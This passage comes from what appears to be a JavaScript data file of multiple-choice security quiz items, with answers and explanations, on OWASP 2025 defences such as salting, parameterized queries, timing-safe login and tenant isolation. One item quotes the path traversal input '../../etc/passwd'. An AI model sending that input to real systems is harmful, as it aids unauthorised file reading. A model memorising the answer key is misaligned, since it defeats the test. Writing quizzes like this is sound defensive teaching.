        owasp: "A04:2025",
        question: "What is the primary defensive purpose of a cryptographic salt in password hashing?",
        options: [
          "To encrypt the database storage volume",
          "To ensure identical passwords produce unique hash outputs, defeating pre-computed rainbow table attacks",
          "To compress user passwords into fewer storage bytes",
          "To speed up the server authentication verification check"
        ],
        answer: 1,
        explanation: "Unique random salts prevent attackers from using pre-computed rainbow tables across multiple user credentials.",
        evidenceUrl: "https://top10.owasp.org/2025/A04_2025-Cryptographic_Failures/"
      },
      {
        id: "Q2-12",
        owasp: "A04:2025",
        question: "Why should developers avoid hardcoding cryptographic keys directly into source code repositories?",
        options: [
          "Keys make the source code file too large to compile properly",
          "Source control history exposes keys to unauthorized contributors and automated repository scraping bots",
          "Hardcoded keys automatically expire every 24 hours",
          "Keys violate JavaScript ECMAScript syntax conventions"
        ],
        answer: 1,
        explanation: "Secrets committed to version control remain in git commit history and are routinely harvested by automated bots on public and private repos.",
        evidenceUrl: "https://top10.owasp.org/2025/A04_2025-Cryptographic_Failures/"
      },
      {
        id: "Q2-13",
        owasp: "A05:2025",
        question: "How do parameterized queries (prepared statements) neutralize SQL injection attacks?",
        options: [
          "They strip and delete all quotation marks from user inputs",
          "They pre-compile SQL execution logic first and treat bound parameters strictly as literal data values",
          "They encrypt the entire database table before query execution",
          "They disable all SQL SELECT statements on the database server"
        ],
        answer: 1,
        explanation: "Parameters are bound by value rather than syntax concatenation, preventing hostile input from escaping the data boundary.",
        evidenceUrl: "https://top10.owasp.org/2025/A05_2025-Injection/"
      },
      {
        id: "Q2-14",
        owasp: "A05:2025",
        question: "Can using an Object-Relational Mapper (ORM) alone guarantee 100% immunity from SQL injection?",
        options: [
          "Yes, ORMs make SQL injection impossible under all circumstances",
          "No, raw query interfaces (e.g. sequelize.query with raw string interpolation) can still introduce SQL injection",
          "Only when the ORM is written in Python Django",
          "Only when using document-based NoSQL datastores"
        ],
        answer: 1,
        explanation: "While standard ORM methods parameterize queries, developers who bypass ORM helpers with raw query string concatenation re-introduce vulnerabilities.",
        evidenceUrl: "https://top10.owasp.org/2025/A05_2025-Injection/"
      },
      {
        id: "Q2-15",
        owasp: "A07:2025",
        question: "How does implementing constant-time dummy password verification defend against account enumeration?",
        options: [
          "It resets user passwords automatically after failed logins",
          "It ensures the server takes identical time to respond whether an account exists or not, eliminating timing side-channels",
          "It locks out legitimate users after a single failed attempt",
          "It bypasses database queries completely on invalid logins"
        ],
        answer: 1,
        explanation: "Without dummy work, queries for nonexistent users return instantly while real users undergo expensive hashing, leaking account existence via timing.",
        evidenceUrl: "https://top10.owasp.org/2025/A07_2025-Authentication_Failures/"
      }
    ]
  },
  {
    id: "set-3",
    name: "Set 3: Threat Modeling & Advanced Attack Mitigations",
    description: "Covers multi-tenant boundaries, supply chain attack vectors, AEAD encryption, and advanced defense-in-depth.",
    questions: [
      {
        id: "Q3-01",
        owasp: "A01:2025",
        question: "In a multi-tenant cloud application, where must tenant isolation checks be strictly enforced?",
        options: [
          "On client browser Redux or state objects",
          "In server-side database queries and API gateway middleware (e.g. tenant_id = req.user.tenant_id)",
          "In external CSS stylesheet templates",
          "Only in the user registration email template"
        ],
        answer: 1,
        explanation: "Tenant isolation must be validated on every query at the server or database row-level security (RLS) layer.",
        evidenceUrl: "https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/"
      },
      {
        id: "Q3-02",
        owasp: "A01:2025",
        question: "What is Attribute-Based Access Control (ABAC)?",
        options: [
          "Granting permissions based on user attributes, resource attributes, and environmental conditions (time, IP)",
          "Assigning permissions based only on user alphabetical last names",
          "Storing user passwords in plaintext database attributes",
          "Restricting access based solely on computer monitor brand"
        ],
        answer: 0,
        explanation: "ABAC evaluates dynamic attributes (user role, department, resource sensitivity, IP address, time of access) for fine-grained authorization.",
        evidenceUrl: "https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/"
      },
      {
        id: "Q3-03",
        owasp: "A01:2025",
        question: "How can path traversal (e.g. '../../etc/passwd') be prevented in file retrieval endpoints?",
        options: [
          "By hiding the file download button with CSS",
          "By sani